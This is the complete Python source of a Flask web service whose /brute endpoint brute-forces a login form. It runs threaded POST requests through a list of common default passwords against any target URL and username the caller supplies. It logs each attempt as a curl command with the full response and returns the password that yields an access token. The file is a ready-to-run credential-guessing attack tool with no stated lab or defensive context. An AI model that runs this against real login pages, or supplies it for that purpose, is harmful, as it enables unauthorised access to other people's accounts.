import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import concurrent.futures

# Determine absolute path for curl.txt in the same directory as this script
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "curl.txt")

app = Flask(__name__)
CORS(
    app,
    resources={r"/*": {"origins": [
        "http://localhost:4000",
        "http://localhost:8000",
        "http://localhost:8001",
        "http://localhost:8002",
        "http://localhost:8003",
        "http://localhost:5002",
        "http://localhost:5003",
    ]}},
    supports_credentials=True
)

DEFAULT_PASSWORDS = [
    "admin123", "password", "123456", "qwerty", "letmein",
    "welcome", "login", "root", "123123", "passw0rd", "admin"
]


def try_login(target_url, username, password, field_map):
    payload = {
        field_map["username"]: username,
        field_map["password"]: password
    }
    try:
        resp = requests.post(target_url, data=payload, timeout=5)
        # log the curl equivalent and the full HTTP response
        with open(LOG_FILE, "a") as log_file:
            curl_cmd = (
                f"curl -X POST '{target_url}' " + \
                " ".join(f"-F '{k}={v}'" for k, v in payload.items())
            )
            log_file.write(curl_cmd + "\n")
            log_file.write("--> Response:\n")
            log_file.write(f"HTTP {resp.status_code} {resp.reason}\n")
            for header, value in resp.headers.items():
                log_file.write(f"{header}: {value}\n")
            log_file.write("\n")
            log_file.write(resp.text + "\n\n")

        if resp.status_code == 200:
            try:
                data = resp.json()
            except ValueError:
                return None
            if "access_token" in data:
                return password
    except requests.RequestException as e:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"--X [{password}] Exception: {e}\n\n")
    return None


@app.route("/brute", methods=["POST"])
def brute_force():
    # Reset log file
    open(LOG_FILE, "w").close()
    print(f"Logging curl output to: {LOG_FILE}")

    req = request.get_json(force=True)
    target_url = req["target_url"]
    username = req["username"]
    field_map = req["form_fields"]
    password_list = req.get("passwords", DEFAULT_PASSWORDS)

    found = None
    attempted = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(try_login, target_url, username, pw, field_map): pw
            for pw in password_list
        }

        for future in concurrent.futures.as_completed(futures):
            pw = futures[future]
            attempted += 1
            try:
                success = future.result()
            except Exception:
                continue

            if success:
                found = pw
                executor.shutdown(wait=False, cancel_futures=True)
                break

    return jsonify({
        "success": bool(found),
        "password": found,
        "attempted": attempted
    })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5002)
